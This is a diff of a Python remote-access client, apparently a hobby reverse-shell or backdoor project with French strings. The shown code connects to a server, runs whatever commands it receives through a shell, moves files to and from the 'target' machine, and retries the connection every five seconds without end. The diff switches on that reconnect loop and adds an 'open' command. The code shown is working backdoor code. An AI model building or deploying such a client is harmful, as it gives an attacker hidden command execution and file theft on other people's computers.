@@ -3,6 +3,11 @@ import socket, os, subprocess, time, sys
 hote = "localhost"
 port = 12800
 
+if os.name == "nt":
+    open_command = "start"
+elif os.name == "posix":
+    open_command = "xdg-open"
+
 def auto_create_folder(folder_path):
     try:
         path = ""
@@ -66,7 +71,6 @@ def connxion(hote,port):
                     downloading_file.close()
                     connect_to_server.send(b"ok")
 
-
                 elif msg_arg[0] == "download_from_target":
                     if len(msg_arg) > 1:
                         try:
@@ -93,10 +97,13 @@ def connxion(hote,port):
                         except FileNotFoundError:
                             stderr = b"Le dossier/fichier n'existe pas"
                     
+
                     elif "".join(msg_arg) == "":
                         stdout = b" "
 
                     else:
+                        if msg_arg[0] == "open":
+                            msg_arg[0] = open_command
                         commande = " ".join(msg_arg).encode()
                         spl = subprocess.Popen(str(commande, "utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                         stdout, stderr = spl.communicate()
@@ -147,9 +154,9 @@ def auto_setup_whetever_you_are():
 
 
 
-auto_setup_whetever_you_are()
+# auto_setup_whetever_you_are()
 
-# while True:
-#     connxion(hote,port)
-#     print("reco dans 5 secondes")
-#     time.sleep(5)
+while True:
+    connxion(hote,port)
+    print("reco dans 5 secondes")
+    time.sleep(5)
